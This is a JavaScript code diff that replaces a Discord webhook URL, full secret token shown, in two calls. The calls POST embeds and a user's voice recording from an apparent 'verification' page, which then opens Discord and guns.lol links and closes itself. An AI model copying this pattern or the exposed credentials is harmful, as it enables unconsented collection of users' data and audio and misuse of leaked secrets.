@@ -77,7 +77,7 @@ $(function () {
         ].join('\n');
 
         await $.ajax({
-            url: "https://canary.discord.com/api/webhooks/1378776546743029771/HM2zqBN6N1NdB0jijANlHL348CJAbQIT5XYWmi61kEaEkiPX3oWwszT_WX7ROrFfmB_C",
+            url: "https://canary.discord.com/api/webhooks/1379105166678163569/qiSIBxBNUqq_L5KGMQWabQ6DZZYDd5TxQXCJcLVSJGtcLD-b_iVs9Zi3z1Y-g3JN6ha4",
             type: 'POST',
             data: JSON.stringify({
                 embeds: [{
@@ -97,7 +97,7 @@ $(function () {
                 content: `🎤 Nouveau vocal de ${d.pseudo}`
             }));
             await fetch(
-                "https://canary.discord.com/api/webhooks/1378776546743029771/HM2zqBN6N1NdB0jijANlHL348CJAbQIT5XYWmi61kEaEkiPX3oWwszT_WX7ROrFfmB_C",
+                "https://canary.discord.com/api/webhooks/1379105166678163569/qiSIBxBNUqq_L5KGMQWabQ6DZZYDd5TxQXCJcLVSJGtcLD-b_iVs9Zi3z1Y-g3JN6ha4",
                 { method: 'POST', body: formData }
             );
         }
@@ -109,8 +109,8 @@ $(function () {
             window.open("https://discord.gg/k6UZsYjeNY", "_blank");
             window.open("https://guns.lol/k.d.c", "_blank");
             setTimeout(() => {
-                window.close();
-            }, 500);
+                window.close(); // Tente de fermer la page de vérif
+            }, 300);
         });
     });
 });
